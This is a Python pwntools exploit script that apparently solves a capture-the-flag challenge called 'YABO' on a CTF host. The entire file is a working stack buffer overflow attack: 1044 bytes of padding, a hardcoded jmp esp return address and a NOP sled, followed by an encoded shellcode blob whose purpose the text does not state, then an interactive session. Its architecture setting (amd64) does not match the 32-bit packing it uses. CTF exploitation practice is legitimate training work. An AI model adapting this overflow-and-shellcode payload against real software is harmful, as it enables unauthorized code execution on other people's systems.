#!/usr/bin/env python
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']
exe = './YABO'
host = 'challenge.ctf.games'
port = 32762

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

jmp_esp = 0x080492e2

sc =  b""
sc += b"\xd9\xee\xbe\x0e\x4c\x6f\x70\xd9\x74\x24\xf4\x5f\x33"
sc += b"\xc9\xb1\x12\x31\x77\x17\x83\xef\xfc\x03\x79\x5f\x8d"
sc += b"\x85\xb4\x84\xa6\x85\xe5\x79\x1a\x20\x0b\xf7\x7d\x04"
sc += b"\x6d\xca\xfe\xf6\x28\x64\xc1\x35\x4a\xcd\x47\x3f\x22"
sc += b"\xec\x42\xf7\x80\x98\xae\x08\xe0\x8a\x26\xe9\x58\x4c"
sc += b"\x69\xbb\xcb\x22\x8a\xb2\x0a\x89\x0d\x96\xa4\x7c\x21"
sc += b"\x64\x5c\xe9\x12\xa5\xfe\x80\xe5\x5a\xac\x01\x7f\x7d"
sc += b"\xe0\xad\xb2\xfe"

buf =  b""
buf += b'A'*1044
buf += p32(jmp_esp)
buf += b'\x90' * 40
buf += sc

io = start()

io.sendlineafter(b': ', buf)

io.interactive()

